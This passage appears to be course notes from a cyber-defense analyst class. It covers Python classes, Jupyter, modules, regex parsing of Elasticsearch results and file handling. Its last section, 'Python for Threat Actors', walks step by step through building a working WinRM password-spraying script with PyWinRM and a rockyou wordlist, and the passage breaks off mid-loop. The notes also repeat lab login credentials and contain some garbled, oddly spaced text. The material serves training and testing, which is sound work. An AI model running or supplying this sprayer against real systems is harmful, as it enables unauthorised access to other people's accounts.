Finally, classes may also contain their own methods. Defining a method within a class benefits from the parameter self, which is a reference to a particular object instance. For example, malwa re1 in th e code above is a variab le which  holds a Malware class object with the name Cryptolocker . The me thod define within the class Malware only needs to take in the parameter self, rather than a specific name value. This is because the name Cryptolocker is passed as an instance variable specific to the object malware1 and is referenceable as self.name when used in the class  method.


![image](https://github.com/user-attachments/assets/a9b33e5c-9a55-4d20-a7a7-041c1b852a8f)



![image](https://github.com/user-attachments/assets/7d0aee28-7cc2-4b42-ae1f-c3138cd63d79)




![image](https://github.com/user-attachments/assets/4dda902a-3996-4008-b0ba-4bbc78eb006b)




![image](https://github.com/user-attachments/assets/68bd24e0-3408-4629-b734-ac6ed4f2b3b9)






Set Up a Jupyter Notebook Using Python
Jupyter Notebook is a browser-based, open-source application that supports program development in a large number of programming languages. The development environment is known as a “notebook.” A Jupyter notebook provides an interactive programming session similar to a Command-Line Interface (CLI). Each notebook of code can be saved, then imported into and exported out of other existing notebooks or Python scripts. Jupyter's seamless integration allows for ease of use, code reusability, and code sharing.

﻿

Jupyter Notebook is useful for collaboration within a coding project as multiple users can use the same notebook to share code. However, Jupyter does not generate code nor does it translate code from one programming language to another. Jupyter cannot help with converting Java or C++ code into Python. This lesson focuses on using only the Python coding language within Jupyter Notebook.

﻿

The following lab walks through the process of creating a new Jupyter Notebook for the controlled execution of Python code. The lab highlights how portions of Python code can be separated into individual sections. This is similar to code breakpoints that allow debugging and analysis before executing an entire program.

﻿

Set Up a Jupyter Notebook
﻿

Create a new Jupyter Notebook. Then, test the notebook by entering Python code, executing commands, and examining the output of running sections of code.



![image](https://github.com/user-attachments/assets/43a2b54c-a114-4724-9baa-16ca48111bb0)



Python Library Modules
Python provides a number of pre-built modules for common tasks to aid in program efficiency. These modules are part of the Python standard library. Locating modules and their source code provides more information on the functionality of the different modules available. This information helps identify and select specific functions to import. This section reviews the following topics to enable analysts to leverage Python modules:

Python standard library
Identifying module functions
Locating a Python module
Python Standard Library
﻿

Although creating and importing custom modules are powerful for code reuse, it is not efficient to create a large number of modules to complete simple tasks such as the following:

Calculating math 
Enumerating filesystem paths
Determining the current date and time
The better option is to use the Python standard library. The library uses Python installers to provide built-in modules that provide standardized functions. For example, one common function from the standard library is math. When imported into a Python script, this function provides several methods of performing arithmetic such as trigonometric functions.

﻿

Another function from the standard library is print. This function prints objects to either a file or standard output (terminal). Unlike math, it is unnecessary to use an import statement to call print since it is a built-in function. Built-in functions are members of the standard library provided to all Python programs by default.

﻿

In addition to modules, the standard library also provides data types such as int, float, str, and list. This provides a great deal of core functionality for Python scripts and handles the logic necessary to ensure that these data types work as expected.

﻿

Identifying Module Functions
﻿

The previous lab used the following line of code to import a function:

from Lab1 import make_sandwich
﻿

This explicitly imports only the function make_sandwich from the module Lab1. Alternatively, the entire module can be imported so that the import includes all additional modules and their functions. This task uses the following syntax, replacing Lab1 with the specific module name:

import Lab1
﻿

Importing a module and all its functions requires Python to place each imported function into memory during execution. This may cause a Python script to use more resources than necessary. This is why the best practice is to import only those functions that are necessary to properly execute a specific Python script.

﻿

 Using dir()
﻿

The function dir() is a handy tool that returns a list of object attributes. It is a member of the standard library, so it does not need to be imported. Using dir() with a module returns the names of the module attributes and functions. Figure 13.4-7, below, displays how the function make_sandwich is listed at the end of all the attributes for the module Lab1.



![image](https://github.com/user-attachments/assets/c9158fb0-b336-4877-a931-28e6e3368993)




The output for dir() depends on the nature of the module being analyzed. The module Lab1 contains only a single function, so its output is sparse. The standard library module math contains a number of functions associated with mathematics, so it outputs significantly more attributes, as displayed in Figure 13.4-8, below:



![image](https://github.com/user-attachments/assets/511abc08-7f57-4320-b66d-0e3cc5649a5d)

Outputting all available attributes is helpful when trying to recall the names of specific functions to import, so that the entire module does not need to be imported. As an example, a script may require computing the square root of a number. Performing the command dir(math) provides the function sqrt as an option. After identifying this function name, the following code can be used to import only the necessary function:
from math import sqrt



This minimizes the footprint of the script. 



Locating a Python Module


Locating Python modules and their source codes is helpful for editing a module's functionality and debugging. An example of a debugging case is if a custom Python program is designed to request the value of pi to 20 decimal places, but this always results in an error. The function pi belongs to the module math. Locating and analyzing the source code for math provides more information as to why this error always occurs. In Python, the function pi within the module math returns the value of pi to 15 decimal places (3.141592653589793) by default. Therefore, requesting a greater number of decimal places outputs an error. Reviewing the source code for different modules, such as math, helps understand their applications and limitations.


Using inspect


The location of a module depends on the organizational structure of a given Python project and whether a certain module is a member of the standard library. One way to locate a Python module is with the module inspect. Although inspect is a built-in module, it is not a member of the standard library. This module provides the method getfile(), which returns the path of the object being inspected. Figure 13.4-9, below, provides an example of importing inspect and printing the getfile() search for the function make_sandwich:



![image](https://github.com/user-attachments/assets/cda0c000-03d2-42a9-9ca0-e1d54719af7e)




The method getfile() can also be used to identify the locations of modules. In the following example in Figure 13.4-10, the module inspect is calling upon itself to identify its own directory:



![image](https://github.com/user-attachments/assets/3f63088b-15d2-40c2-b33a-4897723a02db)



![image](https://github.com/user-attachments/assets/2d1835e9-d593-442d-bac8-ddde15df4987)



![image](https://github.com/user-attachments/assets/1fdcb52b-3415-495d-b530-1cec4e23fbc6)




![image](https://github.com/user-attachments/assets/b40d765d-ad65-472f-9863-7aef5ed935a1)





![image](https://github.com/user-attachments/assets/ccfc435a-e058-4081-bc90-983977802cac)




Data Parsing and Filtering with Python Modules and Functions
The Elasticsearch query from the previous lab outputs many columns of data. This includes the column observer, as highlighted in Figure 13.4-11, below. This column provides Fully Qualified Domain Names (FQDN) as part of strings formatted as {'name': 'FQDN'}. It's possible to parse a list of system FQDNs from these query results after filtering the FQDN from the rest of the characters in the column values.




![image](https://github.com/user-attachments/assets/65a183eb-0c98-49bc-9990-455d0eebd98f)


Parse and Filter Data


Parse and filter data from the Elasticsearch query results in the Lab2 Jupyter Notebook. 


Workflow


1. Log in to the VM lin-hunt-cent with the credentials below:
Username: trainee
Password: CyberTraining1!



2. Open the notebook Lab2 in Jupyter Notebook.


3. Perform text manipulation to extract the FQDNs from the column observer and create a new column systems by entering and executing the following code to the empty cell at the bottom of the Lab2 notebook:
df['observer'] = df['observer'].astype(str)
df['systems'] = df['observer'].str.rsplit("'",3).str[2].str.strip()
df



The Pandas data frame method astype(str) casts the contents of the column observer as a string. Running this command creates the column systems and populates its values through string manipulation of the values in the column observer. The column observer formats its values as {'name': 'FQDN'}, which are two substrings in single quotes that are separated by a colon. This substring arrangement allows the function str.rsplit to use the single quote delimiter to split the string. 


The function str.rsplit("'",3) splits the string {'name': 'FQDN'} at each single quote before FQDN, which creates three substrings. Substrings are counted from zero, so the FQDN is included in substring number two. This is noted with .str[2]. The method str.strip() removes any leading or trailing whitespace characters.


Choosing different substring values changes the results. For example, the output would be different if str[2] was changed to str[0], as displayed in Figure 13.4-12, below. As str.rsplit("'",3) splits the entire string in each entry of the column observer into three substrings, str[0] selects the first substring. The first substring is always {'name.



![image](https://github.com/user-attachments/assets/dfd0e827-8ff2-4585-9a9b-3811448b7cc0)



4. Print the column systems of the Elasticsearch query results by entering and executing the following code into a new empty block in the notebook:
print(df['systems'])



The results present duplicate values. 


5. Filter by unique values by invoking the pandas function unique(), as follows:
print(df['systems'].unique())



Filtering reduces the number of FQDN values from 1240 to just 14 unique values. 


6. Sort the list of unique FQDNs by combining the function sorted() with the function unique(), as follows:
print(sorted(df['systems'].unique()))



Parsing and Filtering with Regular Expressions
The previous lab presented a method of parsing and filtering data that uses string manipulation with the functions rsplit() and strip(). Data can also be parsed and filtered using regular expressions, which act as a powerful shorthand for complex pattern matching. 

﻿

Regular expressions can be used with the Elasticsearch query results from Lab2. In this example, the column observer contains strings that include FQDNs with extraneous characters and information. Figure 13.4-13, below displays how head() is used to limit the number of lines that are printed from the data frame:




![image](https://github.com/user-attachments/assets/a2e66010-fae3-4ec9-8a01-7e2873d0421d)




Each entry in this column follows the pattern {'name': '[FQDN]'}. To extract specific data from each row in the column, a regular expression can be used to parse the FQDN from the substring housed within the second set of single quotes as shown in the code block in Figure 13.4-14, below:



![image](https://github.com/user-attachments/assets/bd6ae433-111a-499f-a793-fe92835630d6)





In this code block, the module for regular expressions (re) is imported, and the data within the column observer is cast into strings. Then, the data in each row of observer is inspected using the function re.findall(). This function is useful in this case since there are multiple pattern matches for each row. The following regular expression is used with this function:
r'\'(.+?)\''



############This regular expression includes the following components:################
r - Treats the pattern as a raw string that allows escape characters.

' - Opens the pattern (only the first single quote).

\' - Indicates that a single quote is part of the pattern and not a closing single quote ending the pattern.

(.+?) - Accepts any characters that follow the previous single quote in a non-greedy fashion. Without the question mark, the entire original string would be returned.

\' - Closes the second single quote pattern, which results in a pattern that searches for any characters contained by single quotes.

' - Closes the first single quote pattern and defines what the regular expression should search for.


![image](https://github.com/user-attachments/assets/006ce0d3-40e4-46ee-bf14-2397e5322eaf)



The function re.findall() returns a list containing all pattern matches within a string. This is useful because each string has two regular expression pattern matches. For example, the first string results in ['name', 'dmz-smtp.energy.com]. Since it is clear that the second substring contains the FQDN, only fqdn[1] is printed in the code block from Figure 13.4-14, above.


The following additional regular expression parsing functions are also available:
re.match() - Searches for a regular expression pattern in a string and returns the first occurrence in the first line. Also ignores any additional patterns that exist in a multi-line string.re.search() - Finds the first pattern match for every line in a string.
Parsing and filtering data allows analysts to reduce the size of a dataset and format it for further analysis. A common analysis task is to search data to match known strings or substrings. The systems data from the notebook Lab2 is an example of data that is ready for closer analysis since it was parsed and filtered in the last lab. This data provides strings and substrings to match against. 


Search Data with Regular Expressions
Continue working in the VM lin-hunt-cent. Identify indicators of compromise by using the regular expression module to search the Elasticsearch query results for the following systems:
BP-WKSTN-10.energy.laneng-wkstn-3.energy.lanzeroday.energy.lan
Workflow


1. Open the notebook Lab2 in Jupyter Notebook, if it is not already open.


2. Search the Elasticsearch query results by entering and executing the following code in the free block at the end of the notebook:
import re
search_list = ["BP-WKSTN-10.energy.lan","eng-wkstn-3.energy.lan","zeroday.energy.lan"]

for i in df['systems'].unique():
    for j in search_list:
        if re.search(j,i):
            print("Found a match for " + j)



This output identifies two systems in the search_list that are present in the Elasticsearch query results, so they are worth investigating. This search calls the function unique() before engaging the column systems to provide refined results. Performing this search without unique() affects the number of results returned and includes the duplicate values that exist in the column systems.


The method above is useful when there is a list of known strings to search for, such as FQDNs. However, often there is only a substring available, such as wkstn. 


3. Display all systems containing the substring wkstn in their FQDN by entering and executing the following:
for i in df['systems'].unique():
    wkstn_hunt = re.search("wkstn", i)
    if wkstn_hunt:
        print("Discovered " + i)



The search result prints only the FQDNs that meet the criteria in the code. These results indicate that the search is case-sensitive. 


4. Ignore casing in the search results by adding re.IGNORECASE to the argument and executing the search, again, as follows:
for i in df['systems'].unique():
    wkstn_hunt = re.search("wkstn", i, re.IGNORECASE)
    if wkstn_hunt:
        print("Discovered " + i)



This results in the regular expression search and filtering provide the most accurate results, according to the search criteria.





![image](https://github.com/user-attachments/assets/12a027b5-12c0-47ac-ba90-58e0ddd4a0bb)



##################CDAH-M13L5-Parsing System Data with Python######################


Using Python to Ingest and Parse Text Files
Python provides built-in functions for reading and writing text files. Each line in a text file is terminated by a special character called End of Line (EOL), which is the new line character \n in Python by default. Python also possesses a File Input/Output (IO) tool as part of its core language. This tool handles everything needed to read and write files. 

﻿

Opening a Text File
﻿

One of the most common functions is the open() function. This command returns a file object as specified in the parameters. A basic example of the open() function is as follows:

f = open('filename', 'mode')
print(f.read())
﻿

In the above example, f stands for file_object, and filename is the name of the file to interact with. The file extension must be included in the filename, and if the file does not exist in the same directory as the Python program, the full file path must be specified. 

﻿

The mode tells Python what to do with the file. Multiple modes can be specified when interacting with text files, such as the following:



![image](https://github.com/user-attachments/assets/7c16204a-9d0c-4992-a695-ad7cac6ac169)



If a file is open, the close() function can be used to close the file and free up system resources used by that file. The syntax for this function is file_object.close(). 


If the open() method is used, the close() method must be used as well; otherwise, the file remains open. Closing the file is easy to forget, however, which can leave the system with multiple open files, using unnecessary system resources. 


A best practice to open Python files is to instead use the syntax with open() as because it does not require using the file_object.close() statement to close the open file. The file is automatically closed when it is no longer used. An example of the with open() as syntax is as follows. In the example, a file named logs.txt is opened in read mode as a file object.

with open(logs.txt, 'r') as file_object:
txt = file_object.read() 




Reading Text Files Line by Line


The most common way to read text files is to use the filename.read() method. This method is useful for small files and reads all text from the file into a string. However, if a file is larger than the amount of available memory on a system, Python returns an error, and reading the file line by line is necessary. For such a file, a for loop can be used to read the text file line by line. An example of this method is as follows:
with open("workData.txt", "r+") as work_data:
     for line in work_data:
          print(line)

A cleaner method to read a file line by line is to use the fileobject.readline() method. This method reads a line of a file and returns it in the form of a string. readline() reads a file until the new line character \n appears. Another method, the fileobject.readlines() method, returns a list of all the next lines into a list of strings. An example of the fileobject.readline() and fileobject.readlines() methods used together is as follows. In the example, f stands for file_object.

f = open('grocery.txt', 'r')
f.readline()         # Read next line into a string
'apple\n'
f.readlines()        # Read all (next) lines into a list of strings
['milk\n', 'bread\n']



Using seek()


In Python, it is possible to change the current file cursor position using the seek() method. The syntax fileobject.seek(0) brings the file cursor to the beginning of the file. This is important when writing to a text file using the append mode because, in that mode, the file cursor position always defaults to the end of the file. If the cursor is not moved to the beginning of the file, the fileobject.write() method returns nothing.


Processes for Reading Compressed Text Files


The Gzip utility is useful for reading compressed text files. The Gzip module must be imported into Python. The syntax for reading a compressed file with Gzip is similar to reading an uncompressed file using the with open() as statement. The following command is used to read a compressed file:

import gzip
with gzip.open('filename', 'r') as fileobject:
     for line in fileobject:
     print(line)



gzip.open('filename') is the syntax used to read the compressed file.


The above method can also be used to write to a compressed file. This is done by modifying only one element of the code above: the r (for read mode) is changed to w (for write mode):
import gzip
with gzip.open('filename', 'w') as fileobject:
     for line in fileobject:
     print(line)




![image](https://github.com/user-attachments/assets/c702b17f-2a85-4de4-aa59-6fa91126bc61)



Using Python to Parse String Data
Python provides multiple functions or methods to parse string data. Three functions, discussed below, are the split() function, strip() function, and slice() function.

﻿

split() Function
﻿

The split() function breaks a large string into smaller strings and returns the strings as a list in Python. The syntax to define a split() function in Python is as follows:


split(separator, max)
﻿

In the example above, separator represents the delimiter. The string or line is split at this specified separator. max represents the maximum number of splits for a given string. The default value of max is −1. If the max parameter is not specified, the split() function splits the given string whenever a separator is encountered. The split() function operates even if the separator is not specified. Python considers any white spaces as the separator to separate the given string or given line.

﻿

An example of when this function is useful is when parsing data from a Comma-Separated Values (CSV) file. The split() function breaks the data separated by a comma into data chunks, making it easier to read.

﻿

strip() Function
﻿

The Python strip() function strips a string so that the leading and trailing characters can be eliminated. After these two characters are removed, a new string is returned in the process. By default, strip() removes the white spaces from the beginning and end of the string. The syntax for this function is as follows:

string.strip([characters])
﻿

Multiple arguments may be placed inside the strip() function. When the characters match the given string, the specified characters are removed in the string output. If no matches are found, no changes are applied to the string. The Python strip() function is frequently used for text formatting. It can remove unnecessary text at the beginning or end of a string to make the output cleaner.  

﻿

slice() Function
﻿

The slice() function extracts part of a string, list, or tuple by using the index number of a specific object or objects. The syntax for this function is as follows:


slice(stop)
slice(start, stop, step)
﻿

Parameters that may be used inside the function are as follows:

start: The starting index where the slicing of an object starts.
stop: The ending index where the slicing of an object stops.
step: An optional argument that determines the increment between each index for slicing. 
﻿

When using the Python slice(stop) function, only the number of indexes where the slicing stops is specified. An example of the slice(stop) function is as follows:


var = slice(25)
print(list[var]) 
﻿

In the above example, only the first 25 objects of var are sliced. 

﻿

It is also possible to provide a start number and stop number in the slice function, in which case the objects beginning with the starting index number and ending with the index number preceding the stop number are sliced. An example of the slice(start, stop) function is as follows. 


var = slice(1,25)
print(list[var])
﻿

In the above example, slicing occurs for objects 1 through 24.

﻿

Inclusion of the step argument, as noted above, provides an increment for slicing between each index.


In the following lab, create a Python script that opens a text file in read mode, execute the script, and read the text file line by line. Then edit the Python script, and use a different method from the first method used to open the text file. 


NOTE: This lesson uses the following commands in the Vim editor:
i - Activates insert mode, allowing text to be written to the file.
:wq - Saves and exits the file, when used in normal mode.  
:set number - Adds lines to the Vim text editor.

Additionally, entering the escape (esc) key exits the insert mode and returns to normal mode. 



Workflow


1. Log in to the Virtual Machine (VM) lin-hunt-cent using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open a Linux terminal.


3. Use the Vim text editor to open the script.py file:
vim script.py



4. On line 1, enter the following text to open the text file grocerylist in read mode:
f = open('grocerylist.txt', 'r') 



5. Enter the following line to print the file object:
print(f.read())


![image](https://github.com/user-attachments/assets/a4b5aac9-e18c-4a10-a75f-71966bc32e41)


6. Save the file, and exit Vim. Execute the Python script:
python script.py



7. Use the Vim text editor to open the script.py file.


8. On line 2, remove the print statement and enter the following to read the script line by line:
data = f.readlines()



9. Enter the following lines of text on lines 3 and 4 to close and print the file:
f.close()
print(data)




![image](https://github.com/user-attachments/assets/9e79f488-a9f9-4680-bba3-752d6ff5c301)


10. Save the file, and exit Vim. Execute the Python script.


The text file is printed in a list format. At the end of each line is a new line character \n, indicating a new line has started in the text file. 


11. Create a new file named parse.py:
vim parse.py



12. Add the following text on lines 1 through 4:
with open('employee_data.txt', 'r') as f:
     txt = f.read()
     sp = txt.split()
     print(sp) 



The lines of text above are using the with open as statement to open a text file in read mode. The split() function then splits the text into individual parts by returning a list of the elements in a string.


13. Save the file, and exit Vim. 


14. Execute the Python script parse.py:
python parse.py



3. Use Vim to create strip.py:
vim strip.py



4. In normal mode, enter the command to have line numbers when using Vim. 


5. On lines 1 and 2, enter the following text to open the /etc/hosts file in read mode for analysis: 

with open('/etc/hosts', 'r') as f:
     txt = f.read()



6. On line 3, add the following text to strip the text file and make the file easier to read: 
st = txt.strip()



When using the Python strip() function, the syntax is string.strip(). In this example, the “string” is the text file in read mode, which was opened with the text on line 1. 


7. On line 4, add the print function to print the output of the Python script:
print(st) 



8. Save the script, and exit Vim.



9. Run the following command to execute the Python script:
python strip.py



The output is provided in Figure 13.5-1:


![image](https://github.com/user-attachments/assets/27b9c6b1-8803-4289-982c-6340a8c56600)


10. Use Vim to create comp.py:
vim comp.py



11. On line 1, enter the following to open the /var/log/messages file:  
with open('/var/log/messages', 'r') as file:



12. On lines 2 through 5, add the following text to iterate through the text file:
     lines = [line.strip('#') for line in file]
     slice1 = slice(10)
     for line in lines:
          print(line.split()[slice1])




This script puts the text file in a list format and then parses through the text file to separate each string, making reading through the file easier. It also uses the slice function, which prints only the first 10 strings of each row in the text file.  


13. Save the script, and exit Vim.


14. Run the following command to execute the Python script:

[trainee@lin-hunt-cent ~]$ sudo python comp.py
[sudo] password for trainee: CyberTraining1! 


![image](https://github.com/user-attachments/assets/f2c6b9cf-64a7-44cf-8fdf-7aec9c1f9187)


15. Use Vim to edit the comp.py file:
vim comp.py



16. On line 3, replace the attribute 10 in slice(10) with 5 so the line looks like below:
slice1 = slice(5)



17. Save the script, and exit Vim.


18. Run the following command to execute the Python script:
[trainee@lin-hunt-cent ~]$ sudo python comp.py
[sudo] password for trainee: CyberTraining1!



The ou tput is  cleane r to re ad.

The output provides five sliced fields to give where before there wasnt 10 fields to give

![image](https://github.com/user-attachments/assets/ce0ee2d7-975f-4f78-b3c3-50b201506941)

![image](https://github.com/user-attachments/assets/ea4bd527-f8bd-4495-b266-2382e3a7f977)



Use Python to Analyze Operating System Data
In the following lab, create a Python script that displays all the processes running on a Linux system, and use the slice function to make the output more readable. 

﻿

NOTE: This lesson uses the following commands in the Vim editor:

i - Activates insert mode, allowing text to be written to the file.
:wq - Saves and exits the file, when used in normal mode.  
:set number - Adds lines to the Vim text editor.
Additionally, entering the escape (esc) key exits the insert mode and returns to normal mode.





﻿


Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a Linux terminal.

﻿

3. Use Vim to create process.py:

vim process.py
﻿

4. In normal mode, enter the command to have line numbers when using Vim. 

﻿

5. Starting on line 1, input the following text to create the process.py file:

from subprocess import Popen, PIPE
process = Popen(['ps', '-ef'],
          stdout=PIPE, stderr=PIPE)
stdout, stderr = process.communicate()
for line in stdout.splitlines():
     print(line)
﻿

This code displays a list of the processes being used on the Linux system and helpful information regarding them. Additional parsing or string manipulation of the results may require additional conversion due to the complexities introduced with character sets and encodings (details of which are beyond this lesson).

﻿

6. Save the file, and exit Vim.

﻿

7. Run the Python script process.py:

[trainee@lin-hunt-cent ~]$ sudo python process.py 
[sudo] password for trainee: CyberTraining1!



 ![image](https://github.com/user-attachments/assets/a1b6f648-7558-4447-ac1d-24f5da1a63c4)


8.  Use Vim to edit process.py:

vim process.py
﻿

9. Add a new line above line 6 to use the Python slice function:

     slice1 = slice(39)
﻿

NOTE: The new line becomes line 6, so all line numbers beginning at the former line 6 increase by 1.

﻿


10. On line 7, edit the print function to print the slice:

print(line[slice1])
﻿

11. Save the file, and exit Vim.

﻿

12. Run the Python script process.py:

sudo python process.py
﻿

The output is broken in half, making it easier to view.

﻿

13. Use Vim to edit process.py:

vim process.py
﻿

14. On line 6, edit the slice attribute:

slice1 = slice(50, 200)
﻿

15. Save the file, and exit Vim.

﻿

16. Execute the Python script process.py:

sudo python process.py  
﻿

The se cond half  of the output may now be viewed. Use this  output to  answe r the foll owing question .


![image](https://github.com/user-attachments/assets/b0b04e1b-0384-4e35-a9f5-7617d004ed90)



Python for Threat Actors
Python has many advantages that make it a popular choice for scripting, such as the following:

Efficient: Premade scripts make constructing new solutions fast and easy.
Versatile: Many premade libraries readily integrate with Python.
Ubiquitous: Various tools and tradecraft are available in Python.
However, these are also the same reasons adversaries choose Python for their toolkits. Namely, there are many libraries available for implementing protocols and communications for adversarial activities. These include the following:

Scapy
ImpacketSMB
Paramiko
Scapy
﻿

Threat actors use the Scapy Python library to create custom packets for network traffic. Creating custom packets is useful for implementing custom communication protocols, triggering certain types of network attacks, and exploiting vulnerable services.

﻿

ImpacketSMB
﻿

ImpacketSMB is a pure Python implementation of Server Message Block (SMB) that allows a threat actor to write a number of different tools that use the SMB protocol. These tools may implement known Windows SMB exploits or target SMB services, such as shared network resources, to execute adversarial tactics such as lateral movement or privilege escalation. ImpacketSMB has been used to create tools such as Impacket-Psexec, which allows attackers to run commands through the SMB share ADMIN$ when a user has the appropriate privileges. With access to the C$ share, this library may also be used to script file listing or file retrieval tools.

﻿

Paramiko
﻿

Paramiko is a pure Python Secure Shell (SSH) library which threat actors use to access the SSH service on a target. Threat actors leverage this tool either for password spraying, credentialed access, or attack execution against vulnerable SSH versions.

﻿Brute Force Authentication over WinRM
An example of how threat actors weaponize Python as an attack tool is by leveraging two components: PyWinRM library and password spraying. These components are also effective for auditing and testing a mission partner environment. Threat actors use these components to create a basic script that authenticates to a host over the Windows Remote Management (WinRM) protocol when provided a username and password as input.

﻿

PyWinRM
﻿

The PyWinRM library contains code to build a Python client for the WinRM service. A threat adversary may use this library to script commands that invoke a target Windows machine from any attack platform that runs Python code. When enabled on victim devices, the WinRM service allows an authenticated user to perform various management tasks remotely. These include, but are not limited to running batch scripts, running PowerShell scripts, and fetching Windows Management Instrumentation (WMI) variables.

﻿

Password Spraying
﻿

As multiple points of presence in an increasingly connected world have become common, the rate of password reuse and password exposure has grown significantly. These parallel, but interconnected, problems contribute to a large and vulnerable attack surface in many organizations. Attackers are aware of the high likelihood of users in a mission partner environment reusing passwords. The attackers, in turn, respond with brute force attacks that leverage lists of passwords exposed by data dumps such as the 2021 Microsoft Exchange breach or the 2019 Facebook leak. These brute force attacks lead to a large reward for very little effort. This is why password spraying is one of the most common techniques that defenders see on external endpoints.

﻿

MITRE provides the following explanation for how adversaries commonly use password spraying in a brute force attack:

﻿

"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords."

﻿

Authenticate Using WinRM
﻿

Create a function that returns True if it connects to a system or False if it does not, given a username and password. First, write code that receives a username and password from a user, then employ PyWinRM library functions to attempt to authenticate to a remote WinRM server with them using a try statement. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt with the following credentials

Username: trainee
Password: CyberTraining1!
﻿

2. In a new terminal, change directories to the lab directory by entering the following:

cd labs
﻿

3. Use either Mousepad, Nano, or Vim to open a new file and name it check_pwd.py. 

﻿

Use this file to write the initial code for accessing a system with the WinRM protocol. 


NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.

﻿

4. Declare Python as the interpreter for the rest of the code in the file by entering the following code:

#!/usr/bin/python3
﻿

This line is known as the “shebang”. It is a decoration at the beginning of the file that tells the operating system which binary file to use as an interpreter.

﻿

5. Inform the Python interpreter to load the shared library PyWinRM by entering the following on the next line:

import winrm
﻿

WinRM is not normally bundled with the default installation of the Python environment, however, it is already installed on this system.

﻿

6. Declare and initialize the test variables to confirm that the upcoming code works by entering the following:

testip = '172.16.4.2'
testusername = 'trainee'
testpassword = 'CyberTaining1!'
testdomain = 'energy'
﻿

7. Declare a new function to use when opening a connection to a target machine over the WinRM protocol and test whether the given username and password combination is functioning correctly:

def check_pwd(targetip,targetusername,targetpassword,targetdomain):
﻿

8. Insert the provided variables into the winrm.Protocol data structure by entering the following:

    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain,targetusername),
        password='{}'.format(targetpassword))
﻿

This is used to authenticate to a WinRM server with the provided configuration. 

﻿

9. Attempt to open a connection to the remote machine by running a simple command and thereafter closing the connection with the following snippet:

    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
﻿

This snippet is wrapped in a try statement. This enables Python to elegantly handle code that may fail with built-in try except statements, making error-handling efficient and easy. 

﻿

A successful authentication returns True to indicate a valid password. Communicating an invalid password to the WinRM server returns InvalidCredentialsError. An except statement handles this error by returning False to indicate an invalid password.

﻿

10. Handle the exception of authentication failures by entering the following code:

    except winrm.exceptions.InvalidCredentialsError:
        return False
﻿

An exception is normally used to handle uncommon situations. However, in this case, the expectation is that this exception will be reached frequently. The purpose of this password spraying script is to perform many failed attempts before the correct password is identified, which returns many instances of a False response.

﻿

11. Return True to indicate a good password by entering the following line:

    return False if std_err else True
﻿

If the authentication does not produce an exception, this line returns True. If the protocol includes some other error text, the authentication provides a final failure check by returning False.

﻿

12. Print output that verifies whether the authentication succeeds or fails by entering the following final lines:

passwordvalidity = check_pwd(testip,testusername,testpassword,testdomain)
print("Password {} is {} for user {}".format(testpassword,'valid' if passwordvalidity else 'invalid',testusername))
﻿

13. Save the file as check_pwd.py and exit the text editor.

﻿

14. Make the script executable by entering the following command:

chmod +x check_pwd.py
﻿

15. Test the function in this script using the following command:

./check_pwd.py




 Create an Attack Script
The previous lab provided an opportunity to create a prototype for WinRM authentication. After writing the function for testing password authentication to the WinRM service, an attacker can automate the process of spraying many passwords at the service. The password spray executes the function many times in succession using passwords from a list. This list may be compiled from generic password dumps or by scraping data of interest - such as hobbies, birthdays, family names, and more from social media sites. The latter is a common open source intelligence practice performed by threat actors prior to an attack.

﻿

Create an Attack Script
﻿

Create an attack to replicate WinRM authentication with many passwords. Generate an intelligence report that provides the password for the user. In this lab, the mission partner’s users are known to have used passwords located in the password list rockyou.txt, located in the directory /usr/share/wordlists.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Create the attack script by opening a new file in any text editor and naming it sprayer.py﻿

﻿

Available text editors include Nano, Vim, and Gedit.

﻿

This file will be used to create an attack script that employs the function check_pwd, which was written in the previous lab. This script uses the libraries PyWinRM and Argparse.

﻿

NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.

﻿

3. Start the attack script by including the headers and library calls, as follows:

#!/usr/bin/python3
import winrm
import argparse
﻿

4. Insert the code from the previous lab that checks the password by entering the following:

def check_pwd(targetip,targetusername,targetpassword,targetdomain):
    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain,targetusername),
        password='{}'.format(targetpassword))
    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
    except winrm.exceptions.InvalidCredentialsError:
        return False
    return False if std_err else True
   

5. Define command line arguments for values that the target user inputs by entering the following lines:

parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, nargs='+', required=True)
parser.add_argument('--domain', type=str, required=True)
parser.add_argument('--user', type=str, required=True)
parser.add_argument('--passwordfile', type=str, required=True)
args = parser.parse_args()
﻿

These lines implement Argparse, which is used to receive input from a user at runtime to dynamically determine the tool’s behavior. In this case, defining input such as IP address, domain name, and a file containing possible passwords allows attackers to employ this tool against any target and with any wordlist. This includes wordlists developed with open source intelligence about a target organization’s users. 

﻿

6. Write a loop that tests passwords in the supplied passwords file against every host IP address listed by the user, by entering the following:

for ip in args.ip:
    print("Testing passwords for user {} on machine {} ...".format(args.user,ip))
    finalpassword = 'No entry in password file'
    with open(args.passwordfile,'r') as passwordfile:
        for password in passwordfile:
            password = password.strip()
            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
            if passwordvalidity:
